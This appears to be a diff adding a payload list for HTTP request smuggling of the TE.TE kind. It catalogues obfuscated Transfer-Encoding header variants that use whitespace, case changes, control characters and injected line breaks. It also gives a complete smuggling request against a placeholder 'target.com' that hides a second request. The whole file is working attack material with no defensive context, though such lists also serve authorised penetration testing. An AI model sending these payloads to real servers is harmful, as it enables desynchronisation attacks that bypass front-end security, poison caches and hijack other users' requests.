@@ -1,0 +1,47 @@
+# ============================================================
+# Request Smuggling — TE.TE (Both use Transfer-Encoding, obfuscate one)
+# ============================================================
+
+# ---- TE.TE Obfuscation — Whitespace ----
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding: chunked, x
+Transfer-Encoding:chunked
+
+# ---- TE.TE Obfuscation — Case Variations ----
+Transfer-Encoding: Chunked
+Transfer-Encoding: CHUNKED
+Transfer-Encoding: cHuNkEd
+
+# ---- TE.TE Obfuscation — Special Characters ----
+Transfer-Encoding: xchunked
+Transfer-Encoding: x-chunked
+Transfer-Encoding[\x0b]: chunked
+Transfer-Encoding[\x0c]: chunked
+Transfer-Encoding[\x09]: chunked
+Transfer-Encoding[ ]: chunked
+X: X[\n]Transfer-Encoding: chunked
+Transfer-Encoding
+: chunked
+
+# ---- TE.TE — Full Smuggle ----
+POST / HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+# ---- TE.TE — Header Injection ----
+Transfer-Encoding: chunked\r\nTransfer-Encoding: cow
+Transfer-Encoding: identity, chunked
+Transfer-Encoding: identity\r\nTransfer-Encoding: chunked
